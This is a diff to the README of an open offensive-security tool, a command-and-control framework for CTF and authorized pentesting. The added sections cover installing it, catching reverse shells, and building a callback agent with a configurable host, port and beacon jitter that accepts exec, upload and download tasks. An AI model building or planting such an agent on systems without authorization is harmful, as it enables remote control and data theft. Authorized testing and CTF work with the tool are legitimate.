@@ -4,10 +4,19 @@
 CLI-based C2 framework for CTF and authorized penetration testing. Catches reverse shells, upgrades them to PTY, runs automated recon, and manages multiple sessions from an interactive operator shell.
 </p>
 
+## Install
+
+```bash
+# Homebrew (not yet available — pending first tag release):
+brew tap exec/homebrew-tap && brew install alcapwn
+
+# Build from source:
+go build -o alcapwn .
+```
+
 ## Quick Start
 
 ```bash
-go build -o alcapwn
 ./alcapwn -l 0.0.0.0:4444
 ```
 
@@ -20,6 +29,26 @@ alcapwn> use 1                   # attach interactively (Ctrl+D to background)
 alcapwn> info 1                  # print full recon summary
 alcapwn> tls 1                   # upgrade session to TLS in-place
 ```
+
+## Agent Binary
+
+alcapwn ships with a standalone agent binary for structured C2 (no PTY shell required).
+
+```bash
+# Build for the local platform:
+CGO_ENABLED=0 go build -o agent_bin \
+  -ldflags "-X main.lhost=<your-ip> -X main.lport=4444 -X main.interval=30 -X main.jitter=5" \
+  ./agent/
+
+# Cross-compile for Linux arm64:
+CGO_ENABLED=0 GOOS=linux GOARCH=arm64 go build -o agent_arm64 \
+  -ldflags "-X main.lhost=<your-ip> -X main.lport=4444" \
+  ./agent/
+```
+
+The agent auto-reconnects, identifies itself by hardware fingerprint, and accepts
+`exec`, `download`, and `upload` tasks. Set `ALCAPWN_DEBUG=1` on the target to
+enable agent-side stderr logging.
 
 ## Reverse Shell Payloads
 
